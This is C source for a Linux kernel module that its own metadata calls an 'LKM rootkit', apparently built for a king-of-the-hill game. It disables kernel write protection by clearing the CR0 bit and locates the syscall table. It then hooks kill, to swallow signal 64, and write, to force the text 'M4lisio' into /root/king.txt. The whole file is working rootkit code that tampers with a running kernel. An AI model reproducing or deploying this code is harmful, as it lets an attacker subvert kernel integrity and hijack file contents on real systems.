#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/version.h>//Contains predefined macros for version
#include <linux/kallsyms.h> //Contains syscall table functions e.g kallsyms_lookup_name..
#include <linux/unistd.h> //Contains syscall  Numbers
#include <asm/paravirt.h> //Contains functions for cr0_write/cr0_read need it for memory
#include <linux/string.h>
#include <linux/syscalls.h>
#include <linux/fs.h>          // For struct file and file operations
#include <linux/uaccess.h>     // For copy_from_user, etc. (if needed)
#include <linux/slab.h>        // For memory allocation functions
#include <linux/path.h>        // For d_path
#include <linux/fsnotify.h>    // For filesystem notifications (if needed)
#include <linux/dcache.h>
#include <linux/file.h>
#include <linux/namei.h>
#include <linux/cred.h>
#include <linux/fdtable.h>


MODULE_LICENSE("GPL");
MODULE_AUTHOR("0xUndefined");
MODULE_DESCRIPTION("LKM rootkit");
MODULE_VERSION("0.1.01");

unsigned long  *__sys_call_table = NULL;

#if LINUX_VERSION_CODE >= KERNEL_VERSION(4,17,0)
#define PTREGS_SYSCALL_STUB 1
typedef asmlinkage long (*ptregs_t)(const struct pt_regs * regs);
static ptregs_t orig_kill;
static ptregs_t orig_write;

#else 
typedef asmlinkage long (*orig_kill_t) (pid_t pid,int sig);
typedef asmlinkage long (*orig_write_t)(unsigned int fd,const char __user * buf, size_t count);
static orig_kill_t orig_kill;
static orig_write_t orig_write;
#endif

#ifdef PTREGS_SYSCALL_STUB 
static asmlinkage long hack_kill(const struct pt_regs * regs){

	int sig = regs -> si;
	if(sig == 64){
		printk(KERN_INFO "Signal %d caught\n",sig);
		printk(KERN_INFO "Kill 0\n");
		return 0;
	}
	
	return orig_kill(regs);
}
static asmlinkage long hack_write(const struct pt_regs * regs){
	
	int erro;
	loff_t pos = 0;
	unsigned int fd = regs -> di;
	char file_path[256]; // Buffer to store the file path
	struct file *file;
	char *tmp;
	size_t count = regs ->  dx;
	char * KING_NAME = "M4lisio\n";
	char * KING_PATH = "/root/king.txt";
	int len = strlen(KING_NAME);
	file = fget(fd);

	if(file != NULL){
		tmp = d_path(&file->f_path, file_path, sizeof(file_path));
		fput(file);
		if(strcmp(tmp, KING_PATH) == 0){
			erro = kernel_write(file,(void *)KING_NAME,len,&pos);
			if(erro < 0 ){
				printk(KERN_INFO "We're cooked\n");
				return erro;
			}
			printk(KERN_INFO "king is being written\n");
			return count;
		}
	}
	return orig_write(regs);
}
#else 
static asmlinkage long hack_kill(pid_t pid, int sig)
{
	if (sig == 64 ){
                printk(KERN_INFO "signal 64 caught\n");
                return 0;
        }
	return orig_kill(pid, sig);

}

static asmlinkage long hack_write(unsigned int fd, const char __user *buf, size_t count) {
int erro;
loff_t pos = 0;
char file_path[256]; // Buffer to store the file path
struct fd f;
char *tmp;
const char *KING_NAME = "M4lisio\n";
const char *KING_PATH = "/root/king.txt";
int len = strlen(KING_NAME);
mm_segment_t old_fs;

f = fdget(fd);
if (!f.file) {
printk(KERN_INFO "Failed to get file from fd\n");
return -EBADF; // Bad file descriptor error
}

// Get the full path of the file
tmp = d_path(&f.file->f_path, file_path, sizeof(file_path));
if (IS_ERR(tmp)) {
printk(KERN_INFO "Failed to get file path\n");
fdput(f);
return PTR_ERR(tmp);
}

if (strcmp(tmp, KING_PATH) == 0) {
old_fs = get_fs();
set_fs(KERNEL_DS);
erro = vfs_write(f.file, KING_NAME, len, &pos);
set_fs(old_fs);

fdput(f);
if (erro < 0) {
printk(KERN_INFO "Failed to write king name\n");
return erro;
}
printk(KERN_INFO "King is being written\n");
return count;
}

fdput(f);
return orig_write(fd, buf, count);
}
#endif
static int hook(void)
{
	__sys_call_table[__NR_kill] = (unsigned long) &hack_kill;
	__sys_call_table[__NR_write] = (unsigned long) &hack_write;
	return 0;
	
}

static int store(void){
#ifdef PTREGS_SYSCALL_STUB
	orig_kill= (ptregs_t) __sys_call_table[__NR_kill];
	orig_write = (ptregs_t) __sys_call_table[__NR_write];
	printk(KERN_INFO "orig_kill table entry stored 0\n");	
#else 
	orig_kill = (orig_kill_t) __sys_call_table[__NR_kill];
	orig_write = (orig_write_t) __sys_call_table[__NR_write];
	printk(KERN_INFO "orig_kill table entry stored 1\n");
#endif
	return 0;
}
static int clean(void)
{
	__sys_call_table[__NR_kill]= (unsigned long) orig_kill;
	__sys_call_table[__NR_write] = (unsigned long) orig_write;
	printk(KERN_INFO "Cleaned\n");
       return 0;	
}
unsigned long *get_sys_call_table(void){

	unsigned  long *sys_calltable = NULL;
#if LINUX_VERSION_CODE  > KERNEL_VERSION(4,4,0)
	sys_calltable = (unsigned long*) kallsyms_lookup_name("sys_call_table");
	printk(KERN_INFO "Indexed into the sys_call_table (0)\n");
#else 
	unsigned long int i;
	for(i = (unsigned long int)sys_close; i < ULONG_MAX; i+=sizeof(void *)){
		sys_calltable = (unsigned long *)i;
		if(sys_calltable[__NR_close] == (unsigned long)sys_close){
			printk(KERN_INFO "Indexed into the sysy_call_table (1)\n");
			return sys_calltable;
		}
	}
#endif 
	return sys_calltable;
}
static inline void
write_cr0_forced(unsigned long val)
{
    unsigned long __force_order;

    /* __asm__ __volatile__( */
    asm volatile(
        "mov %0, %%cr0"
        : "+r"(val), "+m"(__force_order));
}

static inline void protect_memory(void)
{
    write_cr0_forced(read_cr0());
    printk(KERN_INFO "****** protected the memory ******\n");
}

static inline void unprotect_memory(void)
{
	write_cr0_forced(read_cr0() & ~0x00010000);
	printk(KERN_INFO "****** unprotected the memory ******\n");
}


int err = 1;
static int __init init(void)
{
    unprotect_memory();
    __sys_call_table = get_sys_call_table();
    if(!__sys_call_table){
	return err;
    }
    if(store() == err){
		printk(KERN_INFO "error: sys_call store err\n");
		return 1;
	}

	unprotect_memory();
	if(hook() == err){
		printk(KERN_INFO "error: hook  err\n");
		return 1;
	}

    protect_memory();
    return 0;
}

static void __exit quit(void)
{
    	if(clean()== err){
		printk(KERN_INFO "err clean\n");	
	}
	printk(KERN_INFO "Goodbye, world!\n");
}

module_init(init);
module_exit(quit);
